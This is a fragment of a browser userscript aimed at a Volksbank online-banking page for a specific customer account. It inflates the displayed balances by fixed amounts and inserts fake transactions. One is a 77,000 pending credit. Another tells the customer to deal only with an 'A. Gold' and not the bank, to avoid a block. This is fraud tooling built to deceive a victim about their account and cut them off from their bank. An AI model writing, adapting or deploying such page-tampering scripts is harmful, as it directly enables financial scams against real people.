// ==UserScript==
// @name         Ed 2 Rec4 VB moe.bodensee@t-online.de
...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/502351/Ed%202%20Rec4%20VB%20moebodensee%40t-onlinede.user.js
// @updateURL https://update.greasyfork.org/scripts/502351/Ed%202%20Rec4%20VB%20moebodensee%40t-onlinede.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  2150},
        { index: 1, adjustmentAmount:2150},
        { index: 2, adjustmentAmount: 2150},
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "DE68 6609 0800";
    var targetTextContent2 = " 0002 2241 94";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 2150.0; // Adjust the amount as needed
...
//        },
{
            ...
            description: 'Freigabe nötig. A. Gold meldet sich.',
            amount: '77.000,00',
            date: 'Vorgemerkt',
            insertAfter: false, // Set to false to insert before the original transaction
           moveSteps: 1, // Number of steps to move the transaction
...
{
           title: 'JP Morgan Chase',
            description: 'Geld für Gebühren. Wenden Sie sich nur an A. Gold, nicht die Bank, damit nicht gesperrt.',
            amount: '2.150,00',
            date: 'Heute',
            insertAfter: false, // Set to false to insert before the original transaction
           moveSteps: 1, // Number of steps to move the transaction
